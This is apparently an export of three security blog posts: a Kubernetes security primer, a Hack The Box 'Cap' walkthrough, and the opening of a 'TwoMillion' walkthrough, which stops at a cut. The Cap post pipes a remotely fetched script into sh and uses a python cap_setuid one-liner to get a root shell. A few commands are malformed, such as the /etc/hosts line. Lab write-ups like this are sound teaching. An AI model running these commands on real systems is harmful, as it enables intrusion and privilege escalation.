[{"content":"\nIntroduction For anyone in cybersecurity, two questions inevitably arise: What is Kubernetes, and what are the common security risks associated with it? These topics often seem complicated or are explained in overly technical terms.\nThis series provides a practical, hands-on journey through Kubernetes security. I will break down complex concepts into simple explanations, covering:\nKubernetes fundamentals Setting up K8s pentesting labs Common security issues and exploitation techniques Remediation and defense strategies I hope this series will transform your understanding of Kubernetes security. Let\u0026rsquo;s dive in.\nWhat and Why of Kubernetes? The name Kubernetes originates from Greek, meaning helmsman or pilot. The abbreviation K8s comes from counting the eight letters between \u0026ldquo;K\u0026rdquo; and \u0026ldquo;s\u0026rdquo;. Google open-sourced the Kubernetes project in 2014.\nCompanies use Kubernetes for several key reasons:\nAutomated deployment and scaling - Deploy applications and scale them automatically based on demand Self-healing - Restarts failed containers, replaces unhealthy ones, and reschedules workloads when nodes fail Load balancing and service discovery - Distributes traffic efficiently and allows services to find and communicate with each other Storage orchestration - Manages persistent and ephemeral storage for applications RBAC and security controls - Implements access control, network policies, and secrets management for secure workloads One of the best examples we can see nowadays is JioHotstar. They have shared multiple blogs on Kubernetes, including how they shifted their entire infrastructure from Amazon EC2 to Kubernetes and how they scaled up during special events like IPL or the Cricket World Cup. If you\u0026rsquo;re interested in real-world Kubernetes engineering insights, I highly recommend checking out their blog at blog.hotstar.com.\nIt\u0026rsquo;s important to understand that such large-scale implementations help us see the real security challenges that come with Kubernetes. As we dive deeper into Kubernetes pentesting, we\u0026rsquo;ll explore potential misconfigurations, security risks, and how to protect such critical infrastructure.\nKubernetes Architecture Let\u0026rsquo;s understand the Kubernetes architecture using this simple diagram.\nA Kubernetes deployment is called a cluster. A cluster consists of at least one Control Plane (also called Master Node) and one or more Worker Nodes. These can be physical devices, virtual machines, or instances in the cloud.\nControl Plane The Control Plane is the central management layer that maintains the desired state of the cluster. It’s essentially the “brain” of the Kubernetes cluster, making decisions about scheduling, detecting events, and ensuring the cluster operates as intended.\nKey components include the API server, etcd, controller manager, scheduler, and cloud controller manager. It receives information about cluster activity and requests, then uses this information to adjust cluster resources to the desired state. It decides which nodes should run which pods, ensuring optimal resource utilization. In production environments, the control plane usually runs across multiple machines for fault tolerance and high availability. The Control Plane runs on dedicated master nodes, separate from worker nodes that run the actual application workloads. This separation ensures high availability and reliability of the management components.\nWorker Node A worker node, or simply a node, is a physical or virtual machine that runs containerized applications (Pods) in a Kubernetes cluster. While the Control Plane manages the cluster, worker nodes execute workloads by hosting and running Pods.\nEach node can run multiple Pods, depending on its available resources. Worker nodes communicate with the Control Plane to receive instructions and report status. As the core of the Kubernetes data plane, worker nodes handle application execution and networking, ensuring seamless communication between services within and outside the cluster. If the Control Plane is the brain of Kubernetes, then worker nodes are its muscles, executing tasks and running applications. Control Plane Components Kube Control Manager In Kubernetes, a controller is a control loop that watches the shared state of the cluster through the API server and makes changes to move the current state toward the desired state.\nThe kube-controller-manager component is a collection of multiple controllers included in a single binary. This design reduces complexity by running all controllers in a single process. It’s responsible for running multiple controllers that maintain the desired state of the cluster.\nExamples of controllers include the replication controller, endpoints controller, namespace controller, and service accounts controller.\nThe kube-controller-manager constantly monitors the cluster’s state through the Kubernetes API server, tracking the configuration of Pods, Deployments, Services, and other resources. It compares the desired state (as defined in Kubernetes manifests) with the actual state to identify discrepancies. When deviations are detected, the appropriate controllers take action to rectify the situation, such as scaling Pods, restarting failed containers, or recreating resources as needed. Etcd etcd is a fast and highly available distributed key-value database that Kubernetes uses to store all cluster data. Each resource in a cluster has a key in the database. Essentially, etcd stores all cluster data from which the API server can collect and decide how to bridge the current and desired state. Scheduler In Kubernetes, scheduling ensures that Pods are matched to Nodes so that the Kubelet can run them. A scheduler watches for newly created Pods that have no Node assigned. For every Pod that the scheduler discovers, it becomes responsible for finding the best Node for that Pod to run on. The kube-scheduler is a control plane component that determines which node a Pod will run on, ensuring pods are assigned to suitable nodes based on resource availability and constraints. Cloud Controller Manager The cloud-controller-manager is a Kubernetes control plane component that manages cloud-specific operations. It connects your cluster to your cloud provider’s API and separates cloud platform interactions from cluster-only operations. This decoupling of cloud infrastructure logic allows cloud providers to develop and release their features independently from the main Kubernetes project. The cloud-controller-manager uses a plugin architecture, enabling various cloud providers to integrate their platforms with Kubernetes. Worker Node Components Kubelet The kubelet is the main Kubernetes agent that runs on every worker node and is responsible for running the actual containers. Its primary job is to watch the API server for new work tasks. When it detects a task, it executes it and maintains a reporting channel back to the control plane. If the kubelet cannot execute a task, it reports back to the control plane, which then decides what action to take. Kube-proxy Kube-proxy runs on every node and handles local cluster networking by routing network communication between pods and the network. It assigns each node a unique IP address and implements local tables or IPVS rules to manage the routing and load balancing of Pod network traffic. Container Runtime Each node requires a container runtime. The kubelet relies on this runtime to perform container-related tasks such as pulling images, starting containers, and stopping containers. Security Landscape Overview As organizations rapidly migrate to Kubernetes, security teams find themselves in a paradox: the very features that make containers powerful like isolation, orchestration, and their ephemeral nature also create unique security blind spots that traditional tools can’t address.\nConverting monolithic application deployments into microservices using Kubernetes streamlines the entire process. But does this mean it’s a more secure architecture? No. Kubernetes has multiple components that can be easily misconfigured and become targets for attackers. These misconfigurations are commonly overlooked when deploying applications. Ignoring such basic configuration settings can lead to serious security vulnerabilities.\nThe Kubernetes Security Report 2025 by Wiz reveals several concerning findings:\n21% of publicly exposed pods are running with at least one critical or high vulnerability. Over 9% of pods have sensitive host mapping, and 10% of pods are running as root. More than 60% of clusters exposed sensitive information like secrets and config maps. Many clusters lack proper network segmentation or access controls. These statistics highlight that securing Kubernetes requires a deeper understanding of its architecture, configurations, and runtime behavior not just default deployments or surface-level hardening.\nThe gap between Kubernetes adoption and security maturity creates a critical window of vulnerability for many organizations. In most cases, security is implemented after operational deployment and that delay is part of the problem.\nTo accelerate and strengthen security implementation, we’ve seen significant research and tooling development around Kubernetes. The Cloud Native Computing Foundation (CNCF) has developed comprehensive security frameworks, and numerous specialized tools have emerged for Kubernetes security assessment and hardening. Notable tools include Kube-bench, Calico, KubeLinter, Kube-hunter, Kubeaudit, Kubescape, Cilium, Falco, Checkov, and many more.\nIntroduction Kubernetes Threat Modeling Before diving into attacks, it’s important to understand the complexity of Kubernetes. It consists of multiple interconnected components. The API Server acts as the central control point, the Control Plane manages cluster operations, Pods host your applications, and etcd stores all cluster state and configuration data. This architectural complexity creates both power and risk. This is precisely why threat modeling becomes essential for Kubernetes environments.\nMicrosoft has developed a comprehensive threat matrix specifically for Kubernetes that catalogs the most common attack techniques and tactics. This matrix serves as both a checklist and a roadmap, helping security teams understand not just what attacks are possible, but how they typically unfold in real-world scenarios.\nYou can use tools like Mermaid or diagrams.net to visualize your own Kubernetes threat models.\nMicrosoft Threat Matrix for Kubernetes One of the most widely recognized frameworks for understanding Kubernetes threats is the Microsoft Threat Matrix. It maps out common attacker goals and techniques specific to Kubernetes environments. Some notable examples include exposed sensitive interfaces, sidecar injection, and privilege escalation through service account tokens.\nThis matrix provides a structured way to visualize how attackers can navigate through various components of a cluster-making it an essential reference for anyone building a Kubernetes threat model.\nThese techniques serve as a starting point for building a tailored threat model based on your specific cluster configuration and risk surface.\nAttack Paths in Kubernetes Key Kubernetes components from a threat modeling lens:\nAPI Server: Validates and configures data for API objects including pods, services, replication controllers, and others etcd: Fast and highly available distributed key-value database Kubelet: Main Kubernetes agent that runs on every worker node and is responsible for running the actual containers Control Plane: Manages clusters and resources such as worker nodes and pods Node: Physical or virtual machine in the cluster that runs your application containers How attackers exploit these components and impact of it:\nAPI Server: Unauthorized access or privilege escalation via insecure RBAC or misconfigured API endpoints can lead to full cluster compromise etcd: Access to unencrypted etcd data store exposes secrets, configurations, and credentials, enabling full control over the cluster Kubelet: Exploitation of insecure Kubelet API or read-only port allows attackers to execute commands on pods or extract sensitive data Control Plane: Compromise of control plane components allows attackers to manipulate workloads, scheduling, and cluster-wide behavior Node: Container escape or compromised node via vulnerable runtime leads to host-level compromise and lateral movement within the cluster Conclusion: Why Kubernetes Threat Modeling is Crucial Kubernetes is not just an container orchestration platform. It’s complex distributed system where it helps to make entire deployment process easy and flexible but it also comes with misconfigurations, trust boundaries and expanded attack surface.\nThat’s where Threat modeling comes into the picture.\nThreat modeling helps you in:\nUnderstand how an attacker thinks by identifying the components and trust boundaries Prioritize the defense based on the real world risk not just compliance related checks Uncover the possibly weakest path ealy before they\u0026rsquo;re exploited in production TL;DR Threat modeling in kubernetes is not an optional - It’s early warning system\nTransform chaos into clarity Turn assumption into verified controls Helps to prevent security breach before it starts. In a Kubernetes environment, where shared responsibility, and rapid deployments are the norm, threat modeling provides a structured way to think offensively while acting defensively.\nReferences https://medium.com/devops-mojo/kubernetes-architecture-overview-introduction-to-k8s-architecture-and-understanding-k8s-cluster-components-90e11eb34ccd https://www.wiz.io/reports/kubernetes-security-report-2025 https://blog.hotstar.com/ https://www.wiz.io/blog/making-sense-of-kubernetes-initial-access-vectors-part-1-control-plane https://notes.kodekloud.com/ https://www.wiz.io/academy/top-kubernetes-security-tools https://microsoft.github.io/Threat-Matrix-for-Kubernetes https://offensivebytes.com/offensive-container-security Coming next In the next blog post, we will shift from theory to action, exploring initial access and reconnaissance techniques in Kubernetes.\nWe will also examine how exposed clusters are attacked and what you can do to stop them.\nStay tuned. The attack surface is waiting.\n","permalink":"https://bhavik-kanejiya.github.io/blog/kubernetes-security-basics-from-a-pentesters-point-of-view/","summary":"Explore Kubernetes security from a pentester\u0026rsquo;s point of view. Follow a hands-on walkthrough from reconnaissance to root access, focusing on network packet analysis, exploitation techniques, and cluster misconfigurations","title":"Kubernetes Security Basics: From a Pentester’s Point of View"},{"content":"Box Info Attribute Details Level Easy OS Linux Box URL https://app.hackthebox.com/machines/Cap Box Status Retired About Box Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions, including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR), giving access to another user\u0026rsquo;s capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root. Footprinting Nmap Let\u0026rsquo;s start with scanning the machine IP with nmap to check what are the services are running on different ports!\n\u0026gt; nmap -p- --min-rate 10000 10.10.10.245 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 19:52 IST Warning: 10.10.10.245 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.245 Host is up (0.22s latency). Not shown: 65419 closed tcp ports (conn-refused), 113 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 25.15 seconds \u0026gt; nmap -sCV -p 21,22,80 10.10.10.245 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 19:53 IST Nmap scan report for 10.10.10.245 Host is up (0.23s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open http gunicorn |_http-server-header: gunicorn |_http-title: Security Dashboard | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND | Server: gunicorn | Date: Mon, 04 Nov 2024 14:23:27 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 232 | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 3.2 Final//EN\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\u0026lt;/p\u0026gt; | GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Mon, 04 Nov 2024 14:23:19 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 19386 | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html class=\u0026#34;no-js\u0026#34; lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;x-ua-compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Security Dashboard\u0026lt;/title\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;/static/images/icon/favicon.ico\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/themify-icons.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/metisMenu.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/owl.carousel.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/slicknav.min.css\u0026#34;\u0026gt; | \u0026lt;!-- amchar | HTTPOptions: | HTTP/1.0 200 OK | Server: gunicorn | Date: Mon, 04 Nov 2024 14:23:20 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Allow: OPTIONS, GET, HEAD | Content-Length: 0 | RTSPRequest: | HTTP/1.1 400 Bad Request | Connection: close | Content-Type: text/html | Content-Length: 196 | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;Bad Request\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;\u0026lt;p\u0026gt;Bad Request\u0026lt;/p\u0026gt;\u0026lt;/h1\u0026gt; | Invalid HTTP Version \u0026amp;#x27;Invalid HTTP Version: \u0026amp;#x27;RTSP/1.0\u0026amp;#x27;\u0026amp;#x27; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.94SVN%I=7%D=11/4%Time=6728D8D7%P=aarch64-unknown-linux-g SF:nu%r(GetRequest,2F4C,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\n SF:Date:\\x20Mon,\\x2004\\x20Nov\\x202024\\x2014:23:19\\x20GMT\\r\\nConnection:\\x2 SF:0close\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Lengt SF:h:\\x2019386\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20class=\\\u0026#34;no-js\\\u0026#34;\\x20lang SF:=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\\n\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x SF:20\\x20\\x20\u0026lt;meta\\x20http-equiv=\\\u0026#34;x-ua-compatible\\\u0026#34;\\x20content=\\\u0026#34;ie=edge\\ SF:\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Security\\x20Dashboard\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\ SF:x20\u0026lt;meta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\x20content=\\\u0026#34;width=device-width,\\x20initi SF:al-scale=1\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;shortcut\\x20icon\\\u0026#34;\\x20typ SF:e=\\\u0026#34;image/png\\\u0026#34;\\x20href=\\\u0026#34;/static/images/icon/favicon\\.ico\\\u0026#34;\u0026gt;\\n\\x20\\x20 SF:\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/bootstrap\\.mi SF:n\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/stati SF:c/css/font-awesome\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesh SF:eet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/themify-icons\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;lin SF:k\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/metisMenu\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x SF:20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/owl\\.carous SF:el\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34; SF:/static/css/slicknav\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;!--\\x20amchar\u0026#34;)%r(H SF:TTPOptions,B3,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x SF:20Mon,\\x2004\\x20Nov\\x202024\\x2014:23:20\\x20GMT\\r\\nConnection:\\x20close\\ SF:r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nAllow:\\x20OPTIONS,\\x SF:20GET,\\x20HEAD\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,121,\u0026#34;HTT SF:P/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-Type SF::\\x20text/html\\r\\nContent-Length:\\x20196\\r\\n\\r\\n\u0026lt;html\u0026gt;\\n\\x20\\x20\u0026lt;head\u0026gt;\\ SF:n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Bad\\x20Request\u0026lt;/title\u0026gt;\\n\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x SF:20\u0026lt;body\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;h1\u0026gt;\u0026lt;p\u0026gt;Bad\\x20Request\u0026lt;/p\u0026gt;\u0026lt;/h1\u0026gt;\\n\\x20\\x20\\x20\\ SF:x20Invalid\\x20HTTP\\x20Version\\x20\u0026amp;#x27;Invalid\\x20HTTP\\x20Version:\\x20\u0026amp; SF:#x27;RTSP/1\\.0\u0026amp;#x27;\u0026amp;#x27;\\n\\x20\\x20\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;)%r(FourOhFourRe SF:quest,189,\u0026#34;HTTP/1\\.0\\x20404\\x20NOT\\x20FOUND\\r\\nServer:\\x20gunicorn\\r\\nD SF:ate:\\x20Mon,\\x2004\\x20Nov\\x202024\\x2014:23:27\\x20GMT\\r\\nConnection:\\x20 SF:close\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length SF::\\x20232\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20HTML\\x2 SF:03\\.2\\x20Final//EN\\\u0026#34;\u0026gt;\\n\u0026lt;title\u0026gt;404\\x20Not\\x20Found\u0026lt;/title\u0026gt;\\n\u0026lt;h1\u0026gt;Not\\x20F SF:ound\u0026lt;/h1\u0026gt;\\n\u0026lt;p\u0026gt;The\\x20requested\\x20URL\\x20was\\x20not\\x20found\\x20on\\x20t SF:he\\x20server\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manually\\x20ple SF:ase\\x20check\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.\u0026lt;/p\u0026gt;\\n\u0026#34;); Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 145.37 seconds We can see that machine has port 21,22 and 80 (3 TCP) ports are open.\nLet’s add Cap host to our /etc/hosts file:\necho \u0026#34;cap.htb 10.10.10.245\u0026#34; \u0026gt; sudo tee -a /etc/hosts Port 21 FTP We tried to login into FTP as anonymous user since we don\u0026rsquo;t have username and password for any of the services.\nftp 10.10.10.245 Connected to 10.10.10.245. 220 (vsFTPd 3.0.3) Name (10.10.10.245:pixel): anonymous 331 Please specify the password. Password: 530 Login incorrect. ftp: Login failed Port 22 SSH We tried same thing for SSH. We login into ssh as anonymous but it\u0026rsquo;s also an failed attempt.\nssh anonymous@10.10.10.245 anonymous@10.10.10.245\u0026#39;s password: Permission denied, please try again. Port 80 HTTP It is running flask applicaiton that contains the Security Events, Faliled Login Attempts and Port Scan related detail.\nApplicaiton also contains the Security Snapshots that belongs to user Nathan. We can see the refernece from the machine description that we have to find IDOR somewhere in the application.\nAs we can see that, URL contains the numeric ID for the Security Snapshot. We can change the ID and try to see we can access other user\u0026rsquo;s Security Snapshots or not!\nWe changed the ID from 2 to 0 and as we can see result as Snapshot results are getting changed.\nDownload the pcap file and analzye it to see whether we can find anything interesting or not.\nWireshark We can see that, pcap file contains the network logs. After further analysis we found that it contains the user name and password of the user nathan. We can use this credentials to login into FTP and SSH.\nWe can use zeek tool to analyze the pcap file in easy way. Refers to Analyzing PCAP with Zeek - HTB Sherlocks - KnockKnock video by ippsec 🙌\nGetting User shell We already got the user credentials from the pcap file analysis. Which we can use into FTP first to see it\u0026rsquo;s valid credentials or not?\nCredentials:\nUsername: nathan Password: ########### FTP Login ftp cap.htb Connected to cap.htb. 220 (vsFTPd 3.0.3) Name (cap.htb:pixel): nathan 331 Please specify the password. Password: 230 Login successful. Run dir command to list the files and folders\nftp\u0026gt; dir 229 Entering Extended Passive Mode (|||13483|) 150 Here comes the directory listing. -r-------- 1 1001 1001 33 Nov 04 14:22 user.txt 226 Directory send OK. Run the get command download the file and we can see we have our first user.txt flag with us..!\nftp\u0026gt; get user.txt We are able to login into FTP using nathan\u0026rsquo;s credentials and we already have our first user.txt flag.\nGetting Root shell SSH Login ssh nathan@cap.htb Login into SSH to see we can find something innteresting in application code or any bash_history.\nReading the application code The Web applicaiton\u0026rsquo;s code doesn\u0026rsquo;t contain anything intersting. We can move forward to Linpease to find any other ways of exploitation.\nLinpease.sh wget 10.10.15.20:8000/linpease.sh | sh Interesting Output from linpease:\n/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip /usr/bin/ping = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep Before, We jump into the explitation part we have to see what is cap_setuid and how it can be used for privilege escalation?\nWhat is Capabilities and cap_setuid? In Linux, capabilities are like permissions that let specific programs do things only the root (administrator) user usually can. Instead of giving full root access, capabilities let a program use just the parts of root access it needs. For example:\nCAP_NET_BIND_SERVICE: Allows a program to use network ports usually reserved for root. CAP_SETUID: Lets a program change its user ID (UID), essentially letting it switch users. How can cap_setuid can be used for Privilege Escalation? The cap_setuid capability is interesting because it lets a program switch its user ID to any user, including the root user.\nHow to find the programs with cap_setuid? getcap -r / 2\u0026gt;/dev/null | grep cap_setuid Command Explanation:\n\u0026ldquo;getcap\u0026rdquo; is the main command that finds and outputs the capabilities. \u0026ldquo;-r / \u0026quot; means to search recursively in the root directory, which means in the whole file system. \u0026ldquo;2\u0026gt;/dev/null\u0026rdquo; does not output any errors which mostly caused by inaccessible directories. Get the Root We already have get detailed information on how cap_setuid can be used for privilege escalation\n/usr/bin/python3.8 -c \u0026#39;import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; Now, we have the root shell and we can read the flag..!\nroot@cap:~# cat /root/root.txt ############################### Conclusion Cap is an excellent machine for beginners as it teaches essential reconnaissance and basic privilege escalation techniques. The walkthrough covers every phase in detail, giving insights into each command used.\nKey Takeaways Thorough enumeration can reveal important information. Pay attention to SUID binaries for privilege escalation. References https://www.youtube.com/watch?v=O_z6o2xuvlw https://0xdf.gitlab.io/2021/10/02/htb-cap.html https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/ Connect with Me LinkedIn Twitter GitHub Hack The Box ","permalink":"https://bhavik-kanejiya.github.io/blog/htb-cap-walkthrough/","summary":"Explore an in-depth walkthrough of the HTB Cap machine, focusing on network packet analysis and leveraging captured data for exploitation. Follow each step from initial reconnaissance to achieving root access, emphasizing practical network security techniques","title":"HTB Cap Walkthrough"},{"content":"Box Info Attribute Details Level Easy OS Linux Box URL HTB-TwoMillion Box Status Retired About Box TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell. Footprinting Nmap nmap finds two open TCP ports, SSH (22) and HTTP (80):\n\u0026gt; nmap -p- --min-rate 10000 10.10.11.221 Nmap 7.94SVN scan initiated Sat Jan 18 17:24:20 2025 as: nmap -p- --min-rate 10000 -oN 1.basic.nmap.txt 10.10.11.221 Nmap scan report for 10.10.11.221 Host is up (0.22s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Sat Jan 18 17:24:42 2025 -- 1 IP address (1 host up) scanned in 21.88 seconds \u0026gt; nmap -sCV -p 22,80 10.10.11.221 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 17:35 IST Nmap scan report for 10.10.11.221 Host is up (0.22s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx |_http-title: Did not follow redirect to http://2million.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds Let’s add 10.10.11.221 host to our /etc/hosts file:\necho \u0026#34;10.10.11.221 2million.htb\u0026#34; | sudo tee -a /etc/hosts Port - 22 Enumeration We tried the same thing for SSH. We login into SSH anonymous but it\u0026rsquo;s also a failed attempt.\nssh anonymous@10.10.10.245 anonymous@10.10.10.245\u0026#39;s password: Permission denied, please try again. Port - 80 Enumeration Response Headers HTTP/1.1 200 OK Server: nginx Date: Sun, 19 Jan 2025 08:32:05 GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked Connection: keep-alive Set-Cookie: PHPSESSID=srsk0h13obnn855016i953mfd7; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Technology Detection Application Overview The application resembles HTB\u0026rsquo;s old version from 2017. It includes pages such as Login, Invite, Hall of Fame, and FAQ.\nThe the old version of HTB requires an invitation code for the user Sign\nI tried to play with the invitation code option and observed that the application is calling the 2 Javascript files that are being used to send API requests. We tried to see what the both js file contains.\nObfuscated Code We found that the supposed to be inviteapi.min.js is responsible for sending the invitation validation request. The JavaScript file contains multiple keywords like POST, makeInviteCode, verifyInviteCode so looks like it is obfuscated.\nWe used de4js JavaScript Deobfuscator and Unpacker to get the JavaScript in Deobfuscated format.\nDeobfuscated JavaScript:\nfunction verifyInviteCode(code) { var formData = { code: code, }; $.ajax({ type: \u0026#34;POST\u0026#34;, dataType: \u0026#34;json\u0026#34;, data: formData, url: \u0026#34;/api/v1/invite/verify\u0026#34;, success: function (response) { console.log(response); }, error: function (response) { console.log(response); }, }); } function makeInviteCode() { $.ajax({ type: \u0026#34;POST\u0026#34;, dataType: \u0026#34;json\u0026#34;, url: \u0026#34;/api/v1/invite/how/to/generate\u0026#34;, success: function (response) { console.log(response); }, error: function (response) { console.log(response); }, }); } From the deobfuscated JavaScript we can see that the JavaScript contains 2 functions.\nFunction verifyInviteCode is responsible for verifying the Invitation code. Function makeInviteCode is responsible for generating the Invitation code. Generate Invitation Token Upon sending a POST request for How-to-Generate application returns the ROT13 encrypted string.\ncurl -X POST http://2million.htb/api/v1/invite/how/to/generate {\u0026#34;0\u0026#34;:200,\u0026#34;success\u0026#34;:1,\u0026#34;data\u0026#34;:{\u0026#34;data\u0026#34;:\u0026#34;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb 